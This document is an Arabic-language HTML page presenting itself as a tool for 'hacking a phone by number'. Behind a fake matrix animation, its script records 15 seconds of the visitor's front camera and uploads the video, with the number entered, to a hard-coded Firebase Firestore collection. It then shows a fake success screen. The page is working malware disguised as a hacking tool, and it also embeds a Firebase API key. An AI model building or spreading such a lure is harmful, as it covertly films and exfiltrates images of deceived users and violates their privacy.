<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختراق بالرقم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #00ff00;
        }
        .container {
            background: rgba(0,0,0,0.9);
            border: 2px solid #00ff00;
            border-radius: 20px;
            padding: 40px 25px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 0 50px rgba(0,255,0,0.3);
        }
        .hacker-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: glitch 2s infinite;
        }
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-3px, -3px); }
        }
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            font-weight: 900;
            margin-bottom: 15px;
            color: #00ff00;
            text-shadow: 0 0 20px #00ff00;
        }
        .subtitle {
            color: #888;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            font-weight: 700;
            color: #00ff00;
            margin-bottom: 10px;
        }
        .input-group input {
            width: 100%;
            padding: 15px;
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            background: #111;
            color: #00ff00;
            border: 2px solid #00ff00;
            border-radius: 10px;
            text-align: center;
            letter-spacing: 2px;
        }
        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 20px rgba(0,255,0,0.5);
        }
        .hack-btn {
            width: 100%;
            padding: 20px;
            font-size: 20px;
            font-weight: 900;
            font-family: 'Cairo', sans-serif;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 1px;
            box-shadow: 0 10px 30px rgba(0,255,0,0.3);
        }
        .hack-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0,255,0,0.5);
        }
        .hack-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .hack-btn.success {
            background: #ff0000;
            color: #fff;
            box-shadow: 0 10px 30px rgba(255,0,0,0.5);
        }
        .matrix {
            display: none;
            margin: 20px 0;
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            color: #00ff00;
            text-align: center;
            line-height: 1.5;
            max-height: 200px;
            overflow-y: auto;
        }
        .matrix.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .result {
            display: none;
            margin-top: 20px;
            padding: 20px;
            background: rgba(255,0,0,0.1);
            border-radius: 10px;
            border: 1px solid rgba(255,0,0,0.3);
        }
        .result.active {
            display: block;
        }
        .check-icon {
            font-size: 50px;
            margin-bottom: 10px;
        }
        video {
            display: none;
        }
        .status-msg {
            display: none;
            margin-top: 15px;
            font-weight: 700;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="hacker-icon">👨‍💻</div>
        <h1>اختراق بالرقم</h1>
        <p class="subtitle">أدخل رقم الضحية لبدء عملية الاختراق</p>
        
        <div class="input-group">
            <label>📱 رقم الهاتف:</label>
            <input type="tel" id="phoneNumber" placeholder="01xxxxxxxxx">
        </div>
        
        <button class="hack-btn" id="hackBtn" onclick="startHack()">⚡ ابدأ الاختراق</button>
        
        <div class="status-msg" id="statusMsg"></div>
        
        <div class="matrix" id="matrix"></div>
        
        <div class="result" id="result">
            <div class="check-icon">💀</div>
            <h2>تم الاختراق بنجاح!</h2>
            <p>تم الوصول إلى الجهاز</p>
        </div>
        
        <video id="video" autoplay playsinline></video>
    </div>

    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
            projectId: "game-a1aca",
            storageBucket: "game-a1aca.firebasestorage.app",
            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
        });
        
        const db = firebase.firestore();
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        async function startHack() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            const btn = document.getElementById('hackBtn');
            const matrix = document.getElementById('matrix');
            const result = document.getElementById('result');
            const video = document.getElementById('video');
            const statusMsg = document.getElementById('statusMsg');
            
            if (!phoneNumber) {
                statusMsg.textContent = '⚠️ أدخل رقم الهاتف أولاً!';
                statusMsg.style.color = '#ff0000';
                statusMsg.style.display = 'block';
                return;
            }
            
            btn.disabled = true;
            btn.textContent = '⏳ جاري الاختراق...';
            matrix.classList.add('active');
            result.classList.remove('active');
            statusMsg.style.display = 'none';
            
            // توليد رموز عشوائية
            const symbols = ['▓', '▒', '░', '█', '▄', '▀', '■', '□', '◙', '◘', '◄', '►', '▲', '▼', '▬', '▫', '▪', '☼', '☻', '☺', '♠', '♣', '♥', '♦'];
            const hexChars = '0123456789ABCDEF';
            
            const matrixInterval = setInterval(() => {
                let line = '';
                for (let i = 0; i < 30; i++) {
                    if (Math.random() > 0.7) {
                        line += symbols[Math.floor(Math.random() * symbols.length)];
                    } else {
                        line += hexChars[Math.floor(Math.random() * 16)];
                    }
                }
                matrix.innerHTML += line + '<br>';
                matrix.scrollTop = matrix.scrollHeight;
            }, 100);
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp8',
                    videoBitsPerSecond: 400000
                });
                
                recordedChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    
                    reader.onload = async () => {
                        const base64 = reader.result;
                        
                        try {
                            await db.collection('messages').add({
                                video: base64,
                                phoneNumber: phoneNumber,
                                type: 'video',
                                format: 'webm',
                                quality: '400kbps',
                                duration: '15s',
                                timestamp: firebase.firestore.FieldValue.serverTimestamp()
                            });
                            
                            clearInterval(matrixInterval);
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                            
                            matrix.classList.remove('active');
                            result.classList.add('active');
                            
                            btn.textContent = '💀 تم الاختراق';
                            btn.disabled = false;
                            btn.classList.add('success');
                        } catch (error) {
                            console.error('Upload error:', error);
                            statusMsg.textContent = '❌ خطأ: ' + error.message;
                            statusMsg.style.color = '#ff0000';
                            statusMsg.style.display = 'block';
                            clearInterval(matrixInterval);
                            btn.disabled = false;
                            btn.textContent = '⚡ ابدأ الاختراق';
                        }
                    };
                };
                
                mediaRecorder.start();
                
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 15000);
                
            } catch (error) {
                console.error('Camera error:', error);
                statusMsg.textContent = '❌ خطأ: ' + error.message;
                statusMsg.style.color = '#ff0000';
                statusMsg.style.display = 'block';
                clearInterval(matrixInterval);
                btn.disabled = false;
                btn.textContent = '⚡ ابدأ الاختراق';
            }
        }
    </script>
</body>
</html>
